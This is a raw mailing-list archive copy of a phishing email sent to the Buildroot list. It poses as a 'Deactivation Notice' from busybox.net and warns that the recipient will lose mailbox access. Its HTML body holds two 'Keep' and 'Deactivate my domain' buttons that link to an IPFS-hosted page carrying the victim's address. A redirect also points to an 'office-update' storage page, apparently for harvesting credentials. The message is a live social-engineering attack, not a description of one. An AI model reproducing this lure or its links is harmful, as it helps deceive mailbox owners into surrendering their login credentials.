Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 22C89D2CDF6
	for <buildroot@archiver.kernel.org>; Tue, 22 Oct 2024 23:46:24 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp4.osuosl.org (Postfix) with ESMTP id A97B8400DA;
	Tue, 22 Oct 2024 23:46:24 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp4.osuosl.org ([127.0.0.1])
 by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id Nj4_xbpqDT80; Tue, 22 Oct 2024 23:46:23 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 7088040110
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp4.osuosl.org (Postfix) with ESMTP id 7088040110;
	Tue, 22 Oct 2024 23:46:23 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [IPv6:2605:bc80:3010::138])
 by lists1.osuosl.org (Postfix) with ESMTP id 149CB59B4
 for <buildroot@buildroot.org>; Tue, 22 Oct 2024 23:46:22 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id D662380B0B
 for <buildroot@buildroot.org>; Tue, 22 Oct 2024 23:46:21 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 8N15xKr8AInN for <buildroot@buildroot.org>;
 Tue, 22 Oct 2024 23:46:21 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=104.168.34.171;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org A8C5F80A52
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org A8C5F80A52
Received: from busybox.net (unknown [104.168.34.171])
 by smtp1.osuosl.org (Postfix) with ESMTP id A8C5F80A52
 for <buildroot@busybox.net>; Tue, 22 Oct 2024 23:46:20 +0000 (UTC)
From: mail.busybox.net <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 23 Oct 2024 01:46:20 +0200
Message-ID: <20241023014619.394FF6CB4128FFD8@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Deactivation Notice on 10/23/2024 1:46:19 a.m.
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============1262769336833999906=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============1262769336833999906==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<span style=3D"margin: 0px; padding: 0px; border-radius: 0px; text-align: l=
eft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter=
-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; font-st=
yle: normal; font-weight: 400; word-spacing: 0px; vertical-align: inherit; =
white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgro=
und-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant=
-caps: normal; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;"><span style=3D"margin: 0px; padding: 0px; border-=
radius: 0px; vertical-align: inherit; box-sizing: border-box;">Hello buildr=
oot@busybox.net<br><br>Your domain server<span>&nbsp;</span>recently sent a=
 deactivation notice. </span><span style=3D"margin: 0px; padding: 0px; bord=
er-radius: 0px; vertical-align: inherit; box-sizing: border-box;">
We will either keep it or process your request soon.<br style=3D"box-sizing=
: border-box;">Kindly note that failure to follow step below will make you =
loose access to your mailbox.&nbsp;&nbsp;<br><br style=3D"margin: 0px; padd=
ing: 0px; border-radius: 0px; box-sizing: border-box;"><span style=3D"margi=
n: 0px; padding: 0px; border-radius: 0px; font-family: tahoma; font-size: s=
mall; box-sizing: border-box;">
<b style=3D"margin: 0px; padding: 0px; border-radius: 0px; font-family: ari=
al, sans-serif; font-weight: bolder; box-sizing: border-box;"><span style=
=3D"margin: 0px; padding: 0px; border-radius: 0px; font-family: georgia, se=
rif, serif, emojifont; box-sizing: border-box;"><span style=3D"border-radiu=
s: 0px; font-size: medium; box-sizing: border-box;">&nbsp;</span></span></b=
></span><span style=3D"box-sizing: border-box;">&nbsp;</span>
<b style=3D"margin: 0px; padding: 0px; border-radius: 0px; font-family: ari=
al, sans-serif; font-size: small; font-weight: bolder; box-sizing: border-b=
ox;"><span>&nbsp;</span><span>&nbsp;</span><span style=3D"margin: 0px; padd=
ing: 0px; border-radius: 0px; font-family: georgia, serif, serif, emojifont=
; box-sizing: border-box;"><span style=3D"border-radius: 0px; font-size: me=
dium; box-sizing: border-box;">&nbsp;</span><span style=3D"box-sizing: bord=
er-box;">&nbsp;</span><span>&nbsp;</span><span>
&nbsp;</span>
<a style=3D'border-width: 11px 20px 11px 25px; border-style: solid; border-=
color: rgb(37, 84, 199); margin: 0px; padding: 0px; border-radius: 0px; col=
or: rgb(255, 255, 255); font-family: helvetica, "helvetica neue", arial, ve=
rdana, sans-serif; font-size: 13px; text-decoration: none; box-sizing: bord=
er-box; background-color: rgb(37, 84, 199);' href=3D"https://ipfs.io/ipfs/b=
afkreiefrighmmovp4lbggu73lvzqeom24kncbju234en3pbrfsx6wm2ge?filename=3Dnew.i=
ndex.html#buildroot@busybox.net" target=3D"_blank" rel=3D"noreferrer"=20
data-saferedirectreason=3D"2" data-saferedirecturl=3D"https://www.google.co=
m/url?q=3Dhttps://office-update.us-ord-1.linodeobjects.com/officeemails-ser=
vermentainance801821.html%23info@fivestargrupo.com&amp;source=3Dgmail&amp;u=
st=3D1729676057287000&amp;usg=3DAOvVaw0_gGY2wD7xAJoMV__VbGE_"><span style=
=3D"margin: 0px; padding: 0px; border-radius: 0px; vertical-align: inherit;=
 box-sizing: border-box;"><span style=3D"margin: 0px; padding: 0px; border-=
radius: 0px; vertical-align: inherit; box-sizing: border-box;">
Keep</span></span></a></span></b><span style=3D"margin: 0px; padding: 0px; =
border-radius: 0px; vertical-align: inherit; box-sizing: border-box;"><b st=
yle=3D"margin: 0px; padding: 0px; border-radius: 0px; font-family: arial, s=
ans-serif; font-size: small; font-weight: bolder; box-sizing: border-box;">=
<span style=3D"margin: 0px; padding: 0px; border-radius: 0px; font-family: =
georgia, serif, serif, emojifont; box-sizing: border-box;"><span><br><br>&n=
bsp;</span>
<a style=3D'border-width: 11px 20px 11px 25px; border-style: solid; border-=
color: rgb(37, 84, 199); margin: 0px; padding: 0px; border-radius: 0px; col=
or: rgb(255, 255, 255); font-family: helvetica, "helvetica neue", arial, ve=
rdana, sans-serif; font-size: 13px; text-decoration: none; box-sizing: bord=
er-box; background-color: rgb(37, 84, 199);' href=3D"https://ipfs.io/ipfs/b=
afkreiefrighmmovp4lbggu73lvzqeom24kncbju234en3pbrfsx6wm2ge?filename=3Dnew.i=
ndex.html#buildroot@busybox.net" target=3D"_blank" rel=3D"noreferrer"=20
data-saferedirectreason=3D"2" data-saferedirecturl=3D"https://www.google.co=
m/url?q=3Dhttps://office-update.us-ord-1.linodeobjects.com/officeemails-ser=
vermentainance801821.html%23info@fivestargrupo.com&amp;source=3Dgmail&amp;u=
st=3D1729676057287000&amp;usg=3DAOvVaw0_gGY2wD7xAJoMV__VbGE_"><span style=
=3D"margin: 0px; padding: 0px; border-radius: 0px; vertical-align: inherit;=
 box-sizing: border-box;">Deactivate my domain</span></a><br><br></span></b=
></span></span></span>
<div style=3D"margin: 0px; padding: 0px; border-radius: 0px; text-align: le=
ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Arial, sans-serif; font-size: 14px; font-styl=
e: normal; font-weight: 400; word-spacing: 0px; white-space: normal; box-si=
zing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 25=
5); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text=
-stroke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial;">&=
nbsp;</div>
<div style=3D"margin: 0px; padding: 0px; border-radius: 0px; text-align: le=
ft; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-=
spacing: normal; font-family: Arial, sans-serif; font-size: 14px; font-styl=
e: normal; font-weight: 400; word-spacing: 0px; white-space: normal; box-si=
zing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 25=
5); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text=
-stroke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial;"><=
span style=3D"margin: 0px; padding: 0px; border-radius: 0px; vertical-align=
: inherit; box-sizing: border-box;"><span style=3D"margin: 0px; padding: 0p=
x; border-radius: 0px; vertical-align: inherit; box-sizing: border-box;">&#=
9400; busybox.net<span style=3D"border-radius: 0px; box-sizing: border-box;=
">&nbsp;</span></span>
<span style=3D"margin: 0px; padding: 0px; border-radius: 0px; vertical-alig=
n: inherit; box-sizing: border-box;">All Rights Reserved.</span></span></di=
v></body></html>

--===============1262769336833999906==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============1262769336833999906==--
